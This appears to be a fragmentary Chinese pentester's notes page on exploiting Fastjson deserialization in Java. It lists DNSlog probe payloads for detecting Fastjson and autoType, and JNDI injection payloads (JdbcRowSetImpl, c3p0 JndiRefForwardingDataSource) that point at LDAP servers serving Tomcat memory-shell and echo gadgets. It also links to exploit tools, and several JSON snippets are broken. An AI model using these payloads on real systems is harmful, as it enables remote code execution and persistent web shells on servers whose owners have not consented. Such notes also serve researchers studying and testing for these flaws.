---
title: Fastjson
date: 2025-10-02 10:39:08
updated: 2026-05-20 00:59:32
tags:
  - Web
  - java
  - 反序列化
...
[https://github.com/safe6Sec/ShiroAndFastJson](https://github.com/safe6Sec/ShiroAndFastJson)
...
参考[https://mp.weixin.qq.com/s/5mO1L5o8j\_m6RYM6nO-pAA](https://mp.weixin.qq.com/s/5mO1L5o8j_m6RYM6nO-pAA)
...
```java
{"@type":"java.net.InetAddress","val":"a7e5w5.dnslog.cn"}
```
...
Set[{"@type":"java.net.URL","val":"http://2bb24d02.log.dnslogs.dpdns.org."}
{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}
{{"@type":"java.net.URL","val":"http://dnslog"}:0
```

精确探索autoType是否开启，开启后能打更多payload  
[https://github.com/pen4uin/awesome-java-security/tree/main/alibaba%20fastjson](https://github.com/pen4uin/awesome-java-security/tree/main/alibaba%20fastjson)
...
[https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/](https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/)  
...
更高版本绕过可用[https://github.com/veracode-research/rogue-jndi](https://github.com/veracode-research/rogue-jndi)
...
{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://127.0.0.1:1389/Deserialization/FastJson1/mytomcatmemfiltershell",
    "autoCommit": true
}
```
...
```java
{"@type":"com.mchange.v2.c3p0.JndiRefForwardingDataSource","jndiName":"ldap://127.0.0.1:1389/Basic/TomcatEcho", "loginTimeout":0}
```
...
### c3p0#WrapperConnectionPoolDataSource（不出网利用）
...
```java
{
    ...
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"ldap://localhost:1389/Basic/TomcatEcho",
        "autoCommit":true
    }
}
```
...
具体参考  
[https://github.com/Lonely-night/fastjsonVul](https://github.com/Lonely-night/fastjsonVul)
...
文章推荐：[https://www.sec-in.com/article/950](https://www.sec-in.com/article/950)
